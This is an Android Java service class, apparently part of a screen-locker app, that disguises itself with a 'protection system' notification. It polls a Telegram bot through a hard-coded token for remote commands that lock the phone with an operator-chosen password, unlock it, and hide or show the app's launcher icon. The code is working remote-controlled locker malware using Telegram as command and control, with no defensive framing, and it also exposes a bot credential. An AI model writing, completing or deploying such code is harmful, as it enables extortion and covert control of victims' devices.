package com.example.touchlock;

import android.app.*;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    private OkHttpClient client;
    private long lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        startForeground(1, new Notification.Builder(this, "TouchLockChannel")
                .setContentTitle("Система защиты").setContentText("Мониторинг активен")
                .setSmallIcon(android.R.drawable.ic_secure).build());
        
        startPolling();
    }

    private void startPolling() {
        new Thread(() -> {
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Response response = client.newCall(new Request.Builder().url(url).build()).execute();
                    if (response.isSuccessful() && response.body() != null) {
                        JSONObject json = new JSONObject(response.body().string());
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getLong("update_id");
                            
                            if (update.has("message")) {
                                String text = update.getJSONObject("message").optString("text", "");
                                String[] parts = text.split(" ");
                                String cmd = parts[0].toLowerCase();

                                new Handler(Looper.getMainLooper()).post(() -> {
                                    if (TouchLockAccessibilityService.instance != null) {
                                        if (cmd.equals("/block")) {
                                            String pass = (parts.length > 1) ? parts[1] : "0000";
                                            TouchLockAccessibilityService.instance.lock(pass);
                                        } else if (cmd.equals("/stop")) {
                                            TouchLockAccessibilityService.instance.unlock();
                                        } else if (cmd.equals("/hide")) {
                                            updateIconStatus(false);
                                        } else if (cmd.equals("/show")) {
                                            updateIconStatus(true);
                                        }
                                    }
                                });
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void updateIconStatus(boolean show) {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
}

